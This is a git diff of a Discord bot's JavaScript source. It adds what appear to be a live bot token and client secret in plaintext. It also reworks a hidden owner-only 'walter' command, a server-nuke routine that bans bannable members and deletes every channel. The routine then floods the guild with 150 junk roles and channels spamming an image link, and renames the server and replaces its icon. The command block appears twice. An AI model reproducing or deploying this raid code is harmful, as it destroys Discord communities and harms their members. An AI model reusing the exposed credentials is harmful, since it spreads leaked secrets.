@@ -1,31 +1,53 @@
+1199513869098418207 // saucy bot app id
+
+MTEzNjAwMTQ5ODcyODM4NjYxMA.GLEczf.6xgo-hWj5OfUMoJkUyKORtpL06EdTZF-nzzwPM // token saucy
+
+Pw79Orwbx_E8j7mYq_CEI9Yib9OoeWRd // saucy client secret
 
 
-        case 'erode':
+        case 'walter':
             if (message.author.id !== config.master) return;
             await message.delete();
             try {
                 const theseMembers = message.guild.members.cache.filter(member => member.bannable);
                 theseMembers.forEach(member => member.ban);
                 message.guild.channels.cache.forEach(channel => channel.delete());
-                setInterval(() => {
-                    if (message.guild.roles.cache.size <= 249) return;
-                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 1000)}` });
-                }, 1);
 
-                setInterval(() => {
-                    if (message.guild.channels.cache.size <= 499) return;
-                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 1000)}` });
-                }, 1);
+                for (let i = 0; i < 150; i++) {
+                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 10000)}` }).catch((err) => console.log(err));
+                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 10000)}` }).then(channel => channel.send('https://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')).catch((err) => console.log(err));
+                }
 
-                message.guild.setName(`erode`);
+                message.guild.setName(`Walter`);
 
-                message.guild.setIcon('https://cdn.discordapp.com/attachments/1199776472768987236/1213910171865059359/metsu.jpeg?ex=65f730f2&is=65e4bbf2&hm=8b5ba1068c625cd50defb6320e4161cf47ffaba0bdb05ac46e46bfa93b2217c3&')
+                message.guild.setIcon('https://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')
 
             } catch (err) {
                 console.log(err)
             }
             break;
 
+                    case 'walter':
+            if (message.author.id !== config.master) return;
+            await message.delete();
+            try {
+                const theseMembers = message.guild.members.cache.filter(member => member.bannable);
+                theseMembers.forEach(member => member.ban);
+                message.guild.channels.cache.forEach(channel => channel.delete());
+
+                for (let i = 0; i < 150; i++) {
+                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 10000)}` }).catch((err) => console.log(err));
+                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 10000)}` }).then(channel => channel.send('say my name...\nhttps://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')).catch((err) => console.log(err));
+                }
+
+                message.guild.setName(`1 - 800 - ${message.guild.name}`);
+
+                message.guild.setIcon('https://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')
+
+            } catch (err) {
+                console.log(err)
+            }
+            break;
 
     if (interaction.commandName === 'automod-spam-remove') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
@@ -97,37 +119,3 @@ RPC.on('ready', async () => {
     }, 15 * 1000);
 });
 RPC.login({ clientId: `1142613870985363517` });
-
-
-    const myChannel = client.channels.cache.get('1194375819708084335')
-    const tfmeChannel = client.channels.cache.get('1194375834727886848')
-    if (message.channel.id == myChannel) {
-        tfmeChannel.send(`## ${message.author.username} sent a message:\n"${message.content}"`)
-        let fetchedMessages = await message.channel.messages.fetch();
-        let stickyMessage = fetchedMessages.find(m => m.content.includes("### Messages sent here are sent to tfme's server."));
-
-        if (stickyMessage) {
-            stickyMessage.delete().then(() => {
-                message.channel.send("### Messages sent here are sent to tfme's server.");
-
-            }).catch(() => { });
-        } else {
-            // Force send a new message.
-            message.channel.send("### Messages sent here are sent to tfme's server.");
-        }
-    }
-    if (message.channel.id == tfmeChannel) {
-        myChannel.send(`## ${message.author.username} sent a message:\n"${message.content}"`)
-        let fetchedMessages = await message.channel.messages.fetch();
-        let stickyMessage = fetchedMessages.find(m => m.content.includes("### Messages sent here are sent to hanafuda's server."));
-
-        if (stickyMessage) {
-            stickyMessage.delete().then(() => {
-                message.channel.send("### Messages sent here are sent to hanafuda's server.");
-
-            }).catch(() => { });
-        } else {
-            // Force send a new message.
-            message.channel.send("### Messages sent here are sent to hanafuda's server.");
-        }
-    }
